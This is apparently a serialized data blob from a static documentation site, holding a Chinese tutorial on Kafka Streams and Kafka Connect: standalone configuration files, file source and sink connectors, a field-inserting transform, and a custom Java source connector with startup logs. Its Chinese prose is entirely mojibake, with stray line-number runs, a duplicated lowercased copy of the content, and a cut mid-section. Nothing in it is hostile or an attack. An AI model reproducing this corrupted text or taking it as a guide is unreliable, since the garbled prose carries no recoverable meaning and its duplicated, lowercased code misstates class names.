streams.start();\n            // é»å¡ä¸»çº¿ç¨\n            latch.await();\n        }catch(throwable e) {\n            system.exit(1);\n        }\n        system.exit(0);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n\n\n> kafka stream éé¢ç api è¿æ¯æå¿è¦å­¦ä¹ ä¸ä¸ç\n\nææ jar åï¼ç¶åæ jar æ¾å¥ /kafka/libs ä¸ï¼å¯å¨\n\nbin/kafka-run-class.sh com.example.demo.stream.tjstream\n\n\n1\n\n\nå¯å¨ä¹åä¼æå¾å¤è­¦åï¼ä¸éè¦ç®¡ï¼æç§å¦ä¸çæ­¥éª¤æä»¬ç»§ç»­æä½å°±è¡ï¼å°æ­¤å°±è½çå°è¾å¥çæ°æ®ãä»¥ä¸æ¯æè¾åºçç»è®¡ä¿¡æ¯ï¼ä½æ¯ consumer å¨æ¶è´¹çæ¶åæ¯è¾æ¢ï¼ä¸æ¯å³æ¶çã\n\nhaha    4\nhah     1\nha      5\n\n\n1\n2\n3\n\n\n> æä»¬ä¹å¯ä»¥ä½¿ç¨ spring boot æ¥çå¬ streams-wordcount-output è¿ä¸ª topic æ¥æ¥æ¶æ°æ®',charsets:{cjk:!0}},{title:"kafka-2.7.0 kafka Connect",frontmatter:{title:"kafka-2.7.0 kafka Connect",date:"2023-06-25T09:22:36.000Z",permalink:"/kafka/1403",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/02.%E4%B8%AD%E9%97%B4%E4%BB%B6/01.kafka/1403.kafka-2.7.0%20kafka%20Connect.html",relativePath:"02.ä¸­é´ä»¶/01.kafka/1403.kafka-2.7.0 kafka Connect.md",key:"v-4b5e3128",path:"/kafka/1403/",headers:[{level:2,title:"ç®è¿°",slug:"ç®è¿°",normalizedTitle:"ç®è¿°",charIndex:2},{level:2,title:"åæºæ¨¡å¼",slug:"åæºæ¨¡å¼",normalizedTitle:"åæºæ¨¡å¼",charIndex:547},{level:3,title:"ç³»ç»æä»¶è¯»å",slug:"ç³»ç»æä»¶è¯»å",normalizedTitle:"ç³»ç»æä»¶è¯»å",charIndex:556},{level:4,title:"connect-standalone. properties",slug:"connect-standalone-properties",normalizedTitle:"connect-standalone. properties",charIndex:972},{level:4,title:"connect-file-source.properties",slug:"connect-file-source-properties",normalizedTitle:"connect-file-source.properties",charIndex:852},{level:4,title:"connect-file-sink.properties",slug:"connect-file-sink-properties",normalizedTitle:"connect-file-sink.properties",charIndex:914},{level:3,title:"å¯å¨",slug:"å¯å¨",normalizedTitle:"å¯å¨",charIndex:672},{level:4,title:"æ¹ååéåçæ¶æ¯",slug:"æ¹ååéåçæ¶æ¯",normalizedTitle:"æ¹ååéåçæ¶æ¯",charIndex:3741},{level:3,title:"èªå®ä¹ Connector",slug:"èªå®ä¹-connector",normalizedTitle:"èªå®ä¹ connector",charIndex:4685}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"ç®è¿° åæºæ¨¡å¼ ç³»ç»æä»¶è¯»å connect-standalone. properties connect-file-source.properties connect-file-sink.properties å¯å¨ æ¹ååéåçæ¶æ¯ èªå®ä¹ Connector",content:'# ç®è¿°\n\nKafka Connect æ¯ä¸ä¸ªé«ä¼¸ç¼©æ§ãé«å¯é æ§çæ°æ®éæå·¥å·ï¼ç¨äºå¨ Apache Kafka ä¸å¶ä»ç³»ç»é´è¿è¡æ°æ®æ¬è¿ä»¥åæ§è¡ ETL æä½ï¼æ¯å¦ Kafka Connect è½å¤å°æä»¶ç³»ç»ä¸­æäºæä»¶çåå®¹å¨é¨çå¥ Kafka topic ä¸­æèæ¯æ Kafka topic ä¸­çæ¶æ¯å¯¼åºå°å¤é¨çæ°æ®åºç³»ç»ã\n\nKafka Connect ä¸»è¦ç± source connector å sink connector ç»æï¼ä¹å¤§é¨åç ETL æ¡æ¶é½æ¯ç±è¿ä¸¤å¤§ç±»é»è¾ç»ä»¶ç»æçï¼source connector è´è´£æè¾å¥æ°æ®ä»å¤é¨ç³»ç»ä¸­å¯¼å¥å° Kafka ä¸­ï¼è sink connector åè´è´£æè¾åºæ°æ®å¯¼åºå°å¶ä»å¤é¨ç³»ç»\n\nä¸ä¸ª ETL æ¡æ¶æ connector ç³»ç»æ¯å¦å¥½ç¨çä¸»è¦æ å¿ä¹ä¸å°±æ¯ï¼ç source connector å sink connector çç§ç±»æ¯å¦ä¸°å¯ãé»è®¤æä¾ç connector è¶å¤ï¼æä»¬å°±è½éæè¶å¤çå¤é¨ç³»ç»ï¼åå»äºç¨æ·èªè¡å¼åçææ¬ãæ´å¤ç connector å¯ä»¥å¨ github ä¸å»æç´¢ï¼ä¾å¦ kafka connector mysqlï¼kafka connector mongodb ç­ï¼ä¹æ¯æèªè¡å¼åã\n\n\n# åæºæ¨¡å¼\n\n\n# ç³»ç»æä»¶è¯»å\n\nKafka Connect standalone æ¨¡å¼ä¸éå¸¸æ 3 ç±»éç½®æä»¶ï¼ connect éç½®æä»¶ï¼è¥å¹² source connector éç½®æä»¶åè¥å¹² sink connector éç½®æä»¶ãç±äºæ¬ä¾åå«å¯å¨ä¸ä¸ª source connector è¯»å test.txt å§åä¸ä¸ª sink connector åå¥ test.sink.txt ï¼æ source å sink éç½®æä»¶é½åªæä¸ä¸ªï¼æä»¥æ»å±æå¦ä¸ 3 ä¸ªéç½®æä»¶\n\n * connect-standalone.properties: connect standalone æ¨¡å¼ä¸çéç½®æä»¶\n * connect-file-source.properties: file source connector éç½®æä»¶\n * connect-file-sink.properties: file sink connector éç½®æä»¶\n\n# connect-standalone. properties\n\næä»¬é¦åæ¥ç¼è¾ connect-standalone. properties æä»¶ãå®éä¸ï¼ Kafka å·±ç»å¨ config ç®å½ä¸ä¸º\næä»¬æä¾äºä¸ä¸ªè¯¥æä»¶çæ¨¡æ¿ãæä»¬ç´æ¥ä½¿ç¨è¯¥æ¨¡æ¿äºä¿®æ¹å¯¹åºçå®æ®µå³å¯ï¼å¦ä¸ï¼\n\n# æè¿éä¸å®æ¯æ¬å°ipï¼åå çkafkaï¼ä¸ï¼æ­å»º\nbootstrap.servers=192.168.81.62:9092\nkey.converter=org.apache.kafka.connect.json.JsonConverter\nvalue.converter=org.apache.kafka.connect.json.JsonConverter\nkey.converter.schemas.enable=true \nvalue.converter.schemas.enable=true\noffset.storage.file.filename=/tmp/connect.offsets \noffset.flush.interval.ms=10000\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n * key value.converterï¼è®¾ç½® Kafka æ¶æ¯ key/value çæ ¼å¼è½¬åç±»ï¼æ¬ä¾ä½¿ç¨ JsonConverter, å³ææ¯æ¡ Kafka æ¶æ¯è½¬åæä¸ä¸ª JSON æ ¼å¼\n * key/value.converter.schemas.enableï¼è®¾ç½®æ¯å¦éè¦ææ°æ®çæçº¯ JSON å­ç¬¦ä¸²æè JSON æ ¼å¼çå¯¹è±¡ãæ¬ä¾è®¾ç½®ä¸º true ï¼å³ææ°æ®è½¬æ¢æ JSON å¯¹è±¡\n * offset.storage.file.filenameï¼connector ä¼å®æå°å°ç¶æåå¥åºå±å­å¨ä¸­ ãè¯¥åæ°è®¾å®äºç¶æè¦è¢«åå¥çåºå±å­å¨æä»¶çè·¯å¾ãæ¬ä¾ä½¿ç¨ /tmp/connect.offsets ä¿å­ connector çç¶æã\n * offset.flush.interval.msï¼ä¿å­ connector è¿è¡ä¸­ offset å° topic çé¢ç\n\n# connect-file-source.properties\n\nä¸é¢ç¼è¾ connect-file-source.propertiesï¼å®å¨ Kafka ç config ç®å½ä¸ä¹æä¸ä»½æ¨¡æ¿ï¼æ¬ä¾ç´æ¥å¨è¯¥æ¨¡æ¿çåºç¡ä¸è¿è¡ä¿®æ¹\n\nname=local-file-source\nconnector.class=FileStreamSource\ntasks.max=1\nfile=test.txt\ntopic=connect-test\n\n\n1\n2\n3\n4\n5\n\n * nameï¼è®¾ç½®è¯¥ file source connector çåç§°\n * connector.classï¼è®¾ç½® source connector ç±»çå¨éå®å ãææ¶åè®¾ç½®ä¸ºç±»å ä¹æ¯å¯ä»¥çï¼Kafka Connect å¯ä»¥å¨ classpath ä¸­èªå¨æå¯»è¯¥ç±»å¹¶å è½½\n * tasks.maxï¼æ¯ä¸ª connector ä¸ä¼åå»ºè¥å¹²ä¸ªä»»å¡ï¼ task ï¼æ§è¡ connector é»è¾ä»¥ææå¢å å¹¶è¡åº¦ï¼ä½å¯¹äºä»åä¸ªæä»¶è¯» / åæ°æ®è¿æ ·çæä½ï¼ä»»ææ¶å»åªè½æä¸ä¸ª task è®¿é®æä»¶ï¼æè¿éè®¾ç½®æå¤§ä»»å¡æ°ä¸º 1\n * fileï¼è¾å¥æä»¶å¨è·¯å¾åãå³è¡¨ç¤ºè¯¥æä»¶ä½äº Kafka ç®å½ä¸ ãå®éä½¿ç¨æ¶æå¥½ä½¿ç¨ç»å¯¹è·¯å¾ã\n * topicï¼è®¾ç½® source connector ææ°æ®å¯¼å¥å° Kafka çåªä¸ª topic ï¼è¥è¯¥ topic ä¹åä¸å­å¨ï¼å source connector ä¼èªå¨åå»ºãæå¥½æåæå·¥åå»ºåºè¯¥ topic ã\n\n# connect-file-sink.properties\n\nname=local-file-sink\nconnector.class=FileStreamSink\ntasks.max=1\nfile=test.sink.txt\ntopics=connect-test\n\n\n1\n2\n3\n4\n5\n\n * nameï¼è®¾ç½®è¯¥ sink connector åç§°ã\n * connector.classï¼è®¾ç½® sink connector ç±»çå¨éå®åãææ¶åè®¾ç½®ä¸ºç±»åä¹æ¯å¯ä»¥çï¼Kafka Connect å¯ä»¥å¨ classpath ä¸­èªå¨æå¯»è¯¥ç±»äºå è½½ã\n * tasks.maxï¼ä¾ç¶è®¾ç½®ä¸º 1ï¼åçä¸ source connector ä¸­éç½®è®¾ç½®ç¸å\n * fileï¼ï¼è¾åºæä»¶å¨è·¯å¾åï¼å³è¡¨ç¤ºè¯¥æä»¶ä½äº Kafka ç®å½ä¸ã å®éä½¿ç¨æ¶æå¥½ä½¿ç¨ç»å¯¹è·¯å¾\n * topicsï¼è®¾ç½® sink connector å¯¼åº Kafka ä¸­çåªä¸ª topic çæ°æ®ã\n\n\n# å¯å¨\n\nå¯å¨ kafka å zookeeper\n\nbin/zookeeper-server-start.sh config/zookeeper.properties & bin/kafka-server-start.sh -daemon config/server.properties \n\n\n1\n\n\nå¯å¨ connect-standalone\n\nbin/connect-standalone.sh config/connect-standalone.properties \\\nconfig/connect-file-source.properties \\\nconfig/connect-file-sink.properties\n\n\n1\n2\n3\n\n\nå¨ kafka ç®å½ä¸è¾å¥æµè¯\n\necho \'hello\' >> ./test.txt\n\n\n1\n\n\næ¥çå¤åºä¸ä¸æä»¶ test.sink.txt\n\n[root@localhost kafka_2.13-2.7.0]# ls\nbin  config  libs  LICENSE  logs  NOTICE  site-docs  test.sink.txt  test.txt\n\n\n1\n2\n\n\n[root@localhost kafka_2.13-2.7.0]# cat test.sink.txt \nhello\n\n\n1\n2\n\n\n> å¨ spring boot é¡¹ç®çå¬ connect-test ä¸æ ·å¯ä»¥æ¶å°æ¶æ¯ï¼å¦ä¸\n> connect-test {"schema":{"type":"string","optional":false},"payload":"hello"}\n> è¿éçæ¶æ¯å®éä¸é½æ¯ JSON æ ¼å¼çå¯¹è±¡ï¼è¿å°±æ¯ä¸é¢ key value.converter.schemas.enable=true çç¼æ\n\n# æ¹ååéåçæ¶æ¯\n\nä¸é¢çä¾å­åªæ¶å ETL ä¸­ç E å L ï¼å³æ°æ®æ½åï¼ extract ï¼ä¸å è½½ ï¼load ï¼ãä½ä¸º ETL æ¡æ¶ï¼ Kafka Connect ä¹æ¯æç¸å½ç¨åº¦çæ°æ®è½¬æ¢æä½ ä¸é¢æ¼ç¤ºå¨å°æä»¶æ°æ®å¯¼åºå°ç® æ æä»¶ä¹åä¸ºæ¯æ¡æ¶æ¯å¢å ä¸ä¸ª IP å­æ®µ å¦æè¦æå¥åéæå­æ®µï¼æä»¬å¿é¡»ä¿®æ¹ source connector çéç½®æä»¶ï¼å¢å ä»¥ä¸è¿äºè¡ï¼\n\ntransforms=WrapMap,InsertHost\ntransforms.WrapMap.type=org.apache.kafka.connect.transforms.HoistField$Value\ntransforms.WrapMap.field=line\ntransforms.InsertHost.type=org.apache.kafka.connect.transforms.InsertField$Value\ntransforms.InsertHost.static.field=ip\ntransforms.InsertHost.static.value=com.connector.machinel \n\n\n1\n2\n3\n4\n5\n6\n\n\næµè¯å¦ä¸\n\n[root@localhost kafka_2.13-2.7.0]# cat test.sink.txt \nhello\n[root@localhost kafka_2.13-2.7.0]# echo \'add ip test\' >> test.txt \n[root@localhost kafka_2.13-2.7.0]# cat test.sink.txt \nhello\nStruct{line=add ip test,ip=com.connector.machinel}\n\n\n1\n2\n3\n4\n5\n6\n\n\næ¾ç¶ï¼æ°å¢çæ°æ®è¢«å°è£æä¸ä¸ªç»æä½ ï¼Struct ï¼ï¼å¹¶å¢å äº ip å­æ®µãè¿å°±æ¯ä¸é¢ WrapMapï¼InsertHost çä½ç¨ã Kafka Connect è¿æä¾äºå¶ä»çè½¬æ¢æä½ï¼å®æ´ç¨æ³åè§ https://kafka.apache.org/documentation/#connect_transforms\n\n\n# èªå®ä¹ Connector\n\n<dependency>\n    <groupId>org.apache.kafka</groupId>\n    <artifactId>connect-api</artifactId>\n</dependency>\n\n\n1\n2\n3\n4\n\n\npackage com.example.demo.source;\n\nimport com.example.demo.task.FileStreamSourceTask;\nimport org.apache.kafka.common.config.ConfigDef;\nimport org.apache.kafka.connect.connector.Task;\nimport org.apache.kafka.connect.source.SourceConnector;\n\nimport java.util.ArrayList;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\n\n/**\n * @author big uncle\n * @date 2021/2/26 13:44\n * @module\n **/\npublic class FileStreamSourceConnector extends SourceConnector {\n\n    private String filename;\n    private String topic;\n\n    /**\n     *è¿äºé½æ¯éç½®æä»¶éé¢ç key\n    **/\n    public static final String FILE_CONFIG = "file";\n    public static final String TOPIC_CONFIG = "topic";\n\n    @Override\n    public void start(Map<String, String> map) {\n        filename = map.get(FILE_CONFIG);\n        topic = map.get(TOPIC_CONFIG);\n        System.out.println("FileStreamSourceConnector.startï¼"+map.toString());\n    }\n\n    @Override\n    public Class<? extends Task> taskClass() {\n        return FileStreamSourceTask.class;\n    }\n\n    @Override\n    public List<Map<String, String>> taskConfigs(int i) {\n        ArrayList<Map<String, String>> configs =new ArrayList<>();\n        //æ·»å ä¸ä¸ªè¾å¥æµ\n        Map<String, String> config = new HashMap<>() ;\n        if(filename != null){\n            config.put(FILE_CONFIG, filename);\n        }\n        config.put(TOPIC_CONFIG, topic);\n        configs.add(config);\n        System.out.println("FileStreamSourceConnector.taskConfigsï¼"+config.toString());\n        return configs;\n    }\n\n    @Override\n    public void stop() {\n        // å¨è¯¥æ¹æ³ä¸­å³é­ connector ç¨å°çå¤é¨èµæº\n    }\n\n    @Override\n    public ConfigDef config() {\n        System.out.println("FileStreamSourceConnector.configï¼");\n        return new ConfigDef();\n    }\n\n    @Override\n    public String version() {\n        return null;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n\n\npackage com.example.demo.task;\n\nimport com.example.demo.source.FileStreamSourceConnector;\nimport lombok.SneakyThrows;\nimport org.apache.kafka.connect.data.Schema;\nimport org.apache.kafka.connect.source.SourceRecord;\nimport org.apache.kafka.connect.source.SourceTask;\n\nimport java.io.*;\nimport java.util.ArrayList;\nimport java.util.Collections;\nimport java.util.List;\nimport java.util.Map;\n\n/**\n * @author big uncle\n * @date 2021/2/26 13:56\n * @module\n **/\npublic class FileStreamSourceTask extends SourceTask {\n\n    String filename;\n    FileInputStream stream;\n    String topic;\n    BufferedReader reader;\n\n    @Override\n    public String version() {\n        return null;\n    }\n\n    @SneakyThrows\n    @Override\n    public void start(Map<String, String> map) {\n        filename = map.get(FileStreamSourceConnector.FILE_CONFIG);\n        stream = new FileInputStream(filename) ;\n        topic= map.get(FileStreamSourceConnector.TOPIC_CONFIG);\n        reader = new BufferedReader(new InputStreamReader(stream));\n        System.out.println("FileStreamSourceTask.start");\n    }\n\n    /**\n     * pollæ¯ä¸ä¸ªçº¿ç¨ï¼ä¼ä¸ç´æ§è¡ç\n     * @author big uncle\n     * @date 2021/2/26 17:54\n    **/\n    @Override\n    public List<SourceRecord> poll() throws InterruptedException {\n        try{\n            ArrayList<SourceRecord> records= new ArrayList<>();\n            String str = "";\n            while ((str = reader.readLine()) != null && records.isEmpty()) {\n                // sourcePartitionè¡¨ç¤ºè®°å½æ¥èªçåä¸ªè¾å¥sourcePartitionï¼ä¾å¦ï¼æä»¶åï¼è¡¨åæä¸»é¢ååºï¼\n                Map<String, Object> sourcePartition = Collections.singletonMap("filename", filename);\n                // sourceOffsetè¡¨ç¤ºè¯¥sourcePartitionä¸­çä½ç½®ï¼å¯ç¨äºæ¢å¤æ°æ®ä½¿ç¨ã\n                Map<String, Object> sourceOffset = Collections.singletonMap("position", 1);\n                // åä¸ä¸ª SourceRecord å¯¹è±¡\n                SourceRecord sourceRecord = new SourceRecord(sourcePartition, sourceOffset,topic, Schema.STRING_SCHEMA,str);\n                // æ·»å å° records\n                records.add(sourceRecord);\n                System.out.println("FileStreamSourceTask.poll");\n            }\n            return records;\n        }catch(Exception e){\n            e.printStackTrace();\n        }\n        return null;\n    }\n\n    @SneakyThrows\n    @Override\n    public void stop() {\n        if(stream != null) {\n            stream.close();\n        }\n        if(reader!=null) {\n            reader.close();\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n\n\n> æçæ¯ä¸ä¸ª maven é¡¹ç®ï¼æ´ä¸ªé¡¹ç®å°±ä»¥ä¸ä¸¤ä¸ªæä»¶ï¼ææ jar ä¹åï¼ä¸ä¼ å° /kafka/libs ç®å½ï¼ç¶åå¯ä»¥éæ°åä¸ä¸ªéç½®æä»¶ï¼ä¹å¯ä»¥ä½¿ç¨ connect-file-source.properties ç´æ¥ä¿®æ¹\n\nname=local-file-source\nconnector.class=com.example.demo.source.FileStreamSourceConnector\ntasks.max=1\nfile=test.txt\ntopic=ct\n\n\n1\n2\n3\n4\n5\n\n\nå¯å¨æ¹å¼åä»¥ä¸ä¸æ ·\n\n--------------------------------------- å¯å¨æ¥å¿å¼å§ ------------------------------------------\n\n[2021-02-26 15:47:12,592] INFO REST resources initialized; server is started and ready to handle requests (org.apache.kafka.connect.runtime.rest.RestServer:319)\n[2021-02-26 15:47:12,592] INFO Kafka Connect started (org.apache.kafka.connect.runtime.Connect:57)\nFileStreamSourceConnector.configï¼\nFileStreamSourceConnector.configï¼\n\n\n1\n2\n3\n4\n\n\n[2021-02-26 15:47:12,685] INFO Instantiated connector local-file-source with version null of type class com.example.demo.source.FileStreamSourceConnector (org.apache.kafka.connect.runtime.Worker:284)\n[2021-02-26 15:47:12,687] INFO Finished creating connector local-file-source (org.apache.kafka.connect.runtime.Worker:310)\nFileStreamSourceConnector.startï¼{connector.class=com.example.demo.source.FileStreamSourceConnector, file=test.txt, tasks.max=1, name=local-file-source, topic=ct}\n\n\n1\n2\n3\n\n\n (org.apache.kafka.connect.runtime.ConnectorConfig$EnrichedConnectorConfig:361)\nFileStreamSourceConnector.taskConfigsï¼{file=test.txt, topic=ct}\n[2021-02-26 15:47:12,705] INFO Creating task local-file-source-0 (org.apache.kafka.connect.runtime.Worker:509)\n\n\n1\n2\n3\n\n\nFileStreamSourceTask.start\n[2021-02-26 15:47:12,876] INFO WorkerSourceTask{id=local-file-source-0} Source task finished initialization and start (org.apache.kafka.connect.runtime.WorkerSourceTask:233)\n[2021-02-26 15:47:12,877] INFO Created connector local-file-source (org.apache.kafka.connect.cli.ConnectStandalone:112)\nFileStreamSourceTask.poll\n\n\n1\n2\n3\n4\n\n\n--------------------------------------- å¯å¨æ¥å¿ç»æ ------------------------------------------\n\n[root@localhost kafka_2.13-2.7.0]# echo \'dsdsa\' >> test.txt \n[root@localhost kafka_2.13-2.7.0]# echo \'dsdsa\' >> test.txt\n\n\n1\n2\n\n\n[2021-02-26 15:50:41,049] INFO WorkerSourceTask{id=local-file-source-0} Committing offsets (org.apache.kafka.connect.runtime.WorkerSourceTask:478)\n[2021-02-26 15:50:41,050] INFO WorkerSourceTask{id=local-file-source-0} flushing 0 outstanding messages for offset commit (org.apache.kafka.connect.runtime.WorkerSourceTask:495)\n[2021-02-26 15:50:51,051] INFO WorkerSourceTask{id=local-file-source-0} Committing offsets (org.apache.kafka.connect.runtime.WorkerSourceTask:478)\n[2021-02-26 15:50:51,052] INFO WorkerSourceTask{id=local-file-source-0} flushing 0 outstanding messages for offset commit (org.apache.kafka.connect.runtime.WorkerSourceTask:495)\nFileStreamSourceTask.poll\nFileStreamSourceTask.poll\n[2021-02-26 15:51:01,052] INFO WorkerSourceTask{id=local-file-source-0} Committing offsets (org.apache.kafka.connect.runtime.WorkerSourceTask:478)\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nspring boot æ¥æ¶å°æ¶æ¯\n\n@KafkaListener(id = "myId2", topics = "ct")\npublic void listen2(String in) {\n  System.out.println("connect-test"+in);\n}\n\n\n1\n2\n3\n4\n\n\nconnect-test{"schema":{"type":"string","optional":false},"payload":"hello"},{"schema":{"type":"string","optional":false},"payload":"hello"},{"schema":{"type":"string","optional":false},"payload":"dsdsa"},{"schema":{"type":"string","optional":false},"payload":"dsdsa"},{"schema":{"type":"string","optional":false},"payload":"dsdsa"}\n\n\n1\n\n\n> æ¯æ¬¡éå¯é½ä¼æ¶è´¹ä¸æ¬¡ï¼éçé®é¢',normalizedContent:'# ç®è¿°\n\nkafka connect æ¯ä¸ä¸ªé«ä¼¸ç¼©æ§ãé«å¯é æ§çæ°æ®éæå·¥å·ï¼ç¨äºå¨ apache kafka ä¸å¶ä»ç³»ç»é´è¿è¡æ°æ®æ¬è¿ä»¥åæ§è¡ etl æä½ï¼æ¯å¦ kafka connect è½å¤å°æä»¶ç³»ç»ä¸­æäºæä»¶çåå®¹å¨é¨çå¥ kafka topic ä¸­æèæ¯æ kafka topic ä¸­çæ¶æ¯å¯¼åºå°å¤é¨çæ°æ®åºç³»ç»ã\n\nkafka connect ä¸»è¦ç± source connector å sink connector ç»æï¼ä¹å¤§é¨åç etl æ¡æ¶é½æ¯ç±è¿ä¸¤å¤§ç±»é»è¾ç»ä»¶ç»æçï¼source connector è´è´£æè¾å¥æ°æ®ä»å¤é¨ç³»ç»ä¸­å¯¼å¥å° kafka ä¸­ï¼è sink connector åè´è´£æè¾åºæ°æ®å¯¼åºå°å¶ä»å¤é¨ç³»ç»\n\nä¸ä¸ª etl æ¡æ¶æ connector ç³»ç»æ¯å¦å¥½ç¨çä¸»è¦æ å¿ä¹ä¸å°±æ¯ï¼ç source connector å sink connector çç§ç±»æ¯å¦ä¸°å¯ãé»è®¤æä¾ç connector è¶å¤ï¼æä»¬å°±è½éæè¶å¤çå¤é¨ç³»ç»ï¼åå»äºç¨æ·èªè¡å¼åçææ¬ãæ´å¤ç connector å¯ä»¥å¨ github ä¸å»æç´¢ï¼ä¾å¦ kafka connector mysqlï¼kafka connector mongodb ç­ï¼ä¹æ¯æèªè¡å¼åã\n\n\n# åæºæ¨¡å¼\n\n\n# ç³»ç»æä»¶è¯»å\n\nkafka connect standalone æ¨¡å¼ä¸éå¸¸æ 3 ç±»éç½®æä»¶ï¼ connect éç½®æä»¶ï¼è¥å¹² source connector éç½®æä»¶åè¥å¹² sink connector éç½®æä»¶ãç±äºæ¬ä¾åå«å¯å¨ä¸ä¸ª source connector è¯»å test.txt å§åä¸ä¸ª sink connector åå¥ test.sink.txt ï¼æ source å sink éç½®æä»¶é½åªæä¸ä¸ªï¼æä»¥æ»å±æå¦ä¸ 3 ä¸ªéç½®æä»¶\n\n * connect-standalone.properties: connect standalone æ¨¡å¼ä¸çéç½®æä»¶\n * connect-file-source.properties: file source connector éç½®æä»¶\n * connect-file-sink.properties: file sink connector éç½®æä»¶\n\n# connect-standalone. properties\n\næä»¬é¦åæ¥ç¼è¾ connect-standalone. properties æä»¶ãå®éä¸ï¼ kafka å·±ç»å¨ config ç®å½ä¸ä¸º\næä»¬æä¾äºä¸ä¸ªè¯¥æä»¶çæ¨¡æ¿ãæä»¬ç´æ¥ä½¿ç¨è¯¥æ¨¡æ¿äºä¿®æ¹å¯¹åºçå®æ®µå³å¯ï¼å¦ä¸ï¼\n\n# æè¿éä¸å®æ¯æ¬å°ipï¼åå çkafkaï¼ä¸ï¼æ­å»º\nbootstrap.servers=192.168.81.62:9092\nkey.converter=org.apache.kafka.connect.json.jsonconverter\nvalue.converter=org.apache.kafka.connect.json.jsonconverter\nkey.converter.schemas.enable=true \nvalue.converter.schemas.enable=true\noffset.storage.file.filename=/tmp/connect.offsets \noffset.flush.interval.ms=10000\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n * key value.converterï¼è®¾ç½® kafka æ¶æ¯ key/value çæ ¼å¼è½¬åç±»ï¼æ¬ä¾ä½¿ç¨ jsonconverter, å³ææ¯æ¡ kafka æ¶æ¯è½¬åæä¸ä¸ª json æ ¼å¼\n * key/value.converter.schemas.enableï¼è®¾ç½®æ¯å¦éè¦ææ°æ®çæçº¯ json å­ç¬¦ä¸²æè json æ ¼å¼çå¯¹è±¡ãæ¬ä¾è®¾ç½®ä¸º true ï¼å³ææ°æ®è½¬æ¢æ json å¯¹è±¡\n * offset.storage.file.filenameï¼connector ä¼å®æå°å°ç¶æåå¥åºå±å­å¨ä¸­ ãè¯¥åæ°è®¾å®äºç¶æè¦è¢«åå¥çåºå±å­å¨æä»¶çè·¯å¾ãæ¬ä¾ä½¿ç¨ /tmp/connect.offsets ä¿å­ connector çç¶æã\n * offset.flush.interval.msï¼ä¿å­ connector è¿è¡ä¸­ offset å° topic çé¢ç\n\n# connect-file-source.properties\n\nä¸é¢ç¼è¾ connect-file-source.propertiesï¼å®å¨ kafka ç config ç®å½ä¸ä¹æä¸ä»½æ¨¡æ¿ï¼æ¬ä¾ç´æ¥å¨è¯¥æ¨¡æ¿çåºç¡ä¸è¿è¡ä¿®æ¹\n\nname=local-file-source\nconnector.class=filestreamsource\ntasks.max=1\nfile=test.txt\ntopic=connect-test\n\n\n1\n2\n3\n4\n5\n\n * nameï¼è®¾ç½®è¯¥ file source connector çåç§°\n * connector.classï¼è®¾ç½® source connector ç±»çå¨éå®å ãææ¶åè®¾ç½®ä¸ºç±»å ä¹æ¯å¯ä»¥çï¼kafka connect å¯ä»¥å¨ classpath ä¸­èªå¨æå¯»è¯¥ç±»å¹¶å è½½\n * tasks.maxï¼æ¯ä¸ª connector ä¸ä¼åå»ºè¥å¹²ä¸ªä»»å¡ï¼ task ï¼æ§è¡ connector é»è¾ä»¥ææå¢å å¹¶è¡åº¦ï¼ä½å¯¹äºä»åä¸ªæä»¶è¯» / åæ°æ®è¿æ ·çæä½ï¼ä»»ææ¶å»åªè½æä¸ä¸ª task è®¿é®æä»¶ï¼æè¿éè®¾ç½®æå¤§ä»»å¡æ°ä¸º 1\n * fileï¼è¾å¥æä»¶å¨è·¯å¾åãå³è¡¨ç¤ºè¯¥æä»¶ä½äº kafka ç®å½ä¸ ãå®éä½¿ç¨æ¶æå¥½ä½¿ç¨ç»å¯¹è·¯å¾ã\n * topicï¼è®¾ç½® source connector ææ°æ®å¯¼å¥å° kafka çåªä¸ª topic ï¼è¥è¯¥ topic ä¹åä¸å­å¨ï¼å source connector ä¼èªå¨åå»ºãæå¥½æåæå·¥åå»ºåºè¯¥ topic ã\n\n# connect-file-sink.properties\n\nname=local-file-sink\nconnector.class=filestreamsink\ntasks.max=1\nfile=test.sink.txt\ntopics=connect-test\n\n\n1\n2\n3\n4\n5\n\n * nameï¼è®¾ç½®è¯¥ sink connector åç§°ã\n * connector.classï¼è®¾ç½® sink connector ç±»çå¨éå®åãææ¶åè®¾ç½®ä¸ºç±»åä¹æ¯å¯ä»¥çï¼kafka connect å¯ä»¥å¨ classpath ä¸­èªå¨æå¯»è¯¥ç±»äºå è½½ã\n * tasks.maxï¼ä¾ç¶è®¾ç½®ä¸º 1ï¼åçä¸ source connector ä¸­éç½®è®¾ç½®ç¸å\n * fileï¼ï¼è¾åºæä»¶å¨è·¯å¾åï¼å³è¡¨ç¤ºè¯¥æä»¶ä½äº kafka ç®å½ä¸ã å®éä½¿ç¨æ¶æå¥½ä½¿ç¨ç»å¯¹è·¯å¾\n * topicsï¼è®¾ç½® sink connector å¯¼åº kafka ä¸­çåªä¸ª topic çæ°æ®ã\n\n\n# 